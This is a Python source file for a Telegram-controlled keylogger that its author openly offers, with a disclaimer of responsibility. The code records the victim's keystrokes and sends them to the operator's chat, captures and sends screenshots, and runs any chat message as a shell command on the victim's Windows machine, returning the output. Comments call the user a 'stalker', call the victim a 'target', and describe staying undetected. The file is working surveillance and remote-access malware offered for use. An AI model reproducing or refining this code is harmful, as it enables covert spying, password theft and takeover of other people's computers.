# Advanced Telegram Compatible Keylogger Bot by Cem Baran Tunc
# Statement of Responsibility: I am NOT responsible for any malicious use of this code nor any kind of consequences that caused by the one who uses this code partially or fully.

# importing necessary features from various libraries...
from os import remove, system
from time import sleep
from ping3 import ping
from telepot import Bot
from threading import Thread
from pyscreeze import screenshot
from urllib.request import urlopen
from pynput.keyboard import Listener
from telepot.loop import MessageLoop

# "pong" function checks whether the target device is connected to the internet or not by pinging the google search engine periodically.
def pong():
    global temp2
    while 1:
        temp = ping("www.google.com")
        if type(temp) == float:
            temp2 = int(1000 * temp)
        else:
            pass
        sleep(0.5)

# The "main" function
def main():
    id = # Here goes your Telegram ID
    bot = Bot("") # Here goes your bot's specific parameters
    urlopen("http://google.com")
    bot.sendMessage(id, "Active.")

    def handle(msg):
# This function allows stalker to receive a screenshot from target device by typing "shot" command to the chat box.
        if int(str(msg).lower().find("shot")) != -1:
            screenshot().save(r"C:\Users\Public\ .png")
            bot.sendPhoto(id, photo=open(r"C:\Users\Public\ .png", "rb"))
            remove(r"C:\Users\Public\ .png")

# This function allows stalker to track the current ping value of the target device by typing "ping" command to the chat box.
        elif int(str(msg).lower().find("deviceping")) != -1:
            bot.sendMessage(id, str(temp2)+" ms")

# This function starts keylogging.
        elif int(str(msg).lower().find("logstart")) != -1:
            handle.x = 0
            bot.sendMessage(id, "Keylogging is started.")

# This function stops keylogging.
        elif int(str(msg).lower().find("logstop")) != -1:
            handle.x = 99
            bot.sendMessage(id, "Keylogging is stopped.")

# This command makes it possible to send an information message (which includes definitons of commands) to the stalker if the bot receives a message except cmd/powershell commands or the four commands specified above.
        else:
            msgTemp = str(msg).find("text': '")
            msgParsed = str(msg)[int(msgTemp + 8):len(str(msg))-2]
            out = system(msgParsed)
            if out == 0:
                bot.sendMessage(hash, "Prompt command in process...")
                system(msgParsed+r">C:\Users\Public\.txt")
                bot.sendDocument(hash, document=open(r"C:\Users\Public\.txt", "r", encoding='utf-8', errors='ignore'))
                remove(r"C:\Users\Public\.txt")
            else:
                bot.sendMessage(hash, "Invalid CMD/Bot command. Here is the bot command list:\n \nShot = Sends you a snapshot.\nDeviceping = Checks the PC's connection status.\nLogstart = Turns on the keylogger.\nLogstop = Turns off the keylogger.")

    handle.x = 0

    MessageLoop(bot, handle).run_as_thread()

    def on_press(key):
# The function right below skips the most held down buttons to remain undetected to the target user.
        if '{0}'.format(key) not in {'Key.backspace'.format(key),'Key.right'.format(key),'Key.left'.format(key),'Key.up'.format(key),'Key.down'.format(key),'Key.delete'.format(key)}:
# in order to prevent crashes, the function below disables the keylogging automatically whenever the target device's ping value exceeds 100.
            if (temp2 < 100-int(handle.x)):
                try:
                    bot.sendMessage(id, str(key))
                except:
                    pass
            else:
                pass
        else:
            pass

    with Listener(on_press=on_press) as listener:
        listener.join()

t1 = Thread(target = pong)
t2 = Thread(target = main)

t1.start()
t2.start()
